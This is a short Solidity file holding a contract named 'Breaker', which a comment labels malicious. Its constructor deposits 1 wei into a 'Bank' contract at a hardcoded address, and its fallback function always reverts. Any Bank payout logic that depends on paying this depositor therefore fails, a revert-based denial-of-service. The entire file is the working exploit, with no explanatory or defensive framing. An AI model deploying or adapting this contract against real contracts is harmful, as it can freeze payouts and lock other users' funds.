pragma solidity ^0.4.24;

contract Bank{
    function deposit() public payable;
    function withdraw() public;
}

contract Breaker{
    Bank code = Bank(0xE7E1490704265ABe44E3dDD5c1A4afd9ffcf1A17);
    constructor() public payable{
        code.deposit.value(1 wei)();
    }
    //malicious contract to revert payments and break contract.
    function() public payable{
        revert();
    }
}